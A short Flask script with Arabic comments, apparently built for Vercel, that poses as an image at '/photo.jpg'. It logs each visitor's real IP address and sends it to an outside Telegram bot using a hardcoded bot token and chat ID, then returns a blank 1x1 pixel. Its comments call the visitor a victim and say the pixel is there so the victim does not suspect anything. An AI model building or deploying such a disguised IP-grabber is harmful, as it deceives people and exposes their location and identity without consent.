from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

# بياناتك الصحيحة 100%
TOKEN = "8459471902:AAHLHHniOWAQSDznm5TFWWmUzROr9cf_CUo"
CHAT_ID = "8524242091"

@app.route('/')
@app.route('/photo.jpg')
def index():
    # 1. جلب الـ IP الحقيقي
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # 2. إرسال الرسالة (استخدمنا رابط مباشر لضمان عدم الفشل)
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {
        "chat_id": CHAT_ID,
        "text": f"🔥 تم الصيد بنجاح!\nIP: {ip}\nالرابط شغال يا وحش!",
        "parse_mode": "HTML"
    }
    
    try:
        # هذه السطر هو الذي يرسل الرسالة فعلياً
        requests.get(url, params=params, timeout=10)
    except Exception as e:
        # إذا حدث خطأ، سيظهر لك في سجلات Vercel
        print(f"Error: {e}")

    # 3. إرسال النقطة البيضاء (لكي لا يشك الضحية)
    pixel = io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
    return send_file(pixel, mimetype='image/png')

# ضروري لـ Vercel
if __name__ == "__main__":
    app.run()
